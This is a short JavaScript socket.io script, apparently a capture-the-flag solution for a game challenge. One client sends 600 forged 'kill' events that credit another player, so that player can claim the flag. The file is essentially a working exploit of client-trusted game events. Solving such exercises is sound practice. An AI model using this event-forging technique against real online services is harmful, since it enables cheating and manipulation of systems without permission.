var socket1 = io();
var socket2 = io();

var killerId;
var count = 0;

function start(socket, uname) {
    socket.emit("start", { name: uname });
}

socket1.on("serverState", data => {
    killerId = data.id;
    console.log(killerId)
});

socket1.on("killBroadcast", data => {
    let killer = data.killer;
    let killed = data.killed;
    console.log(`${killer} 干掉了 ${killed}`);
    count++;
    console.log(count);
});
socket1.on("getFlag", data => alert(data.flag));

start(socket1, "aaa");
start(socket2, "bbb");

setTimeout(() => {
    for(let i=0;i<600;i++) {
        socket2.emit("kill", {killer: killerId});
    }
}, 800);

setTimeout(() => socket1.emit("getFlag"),2000);

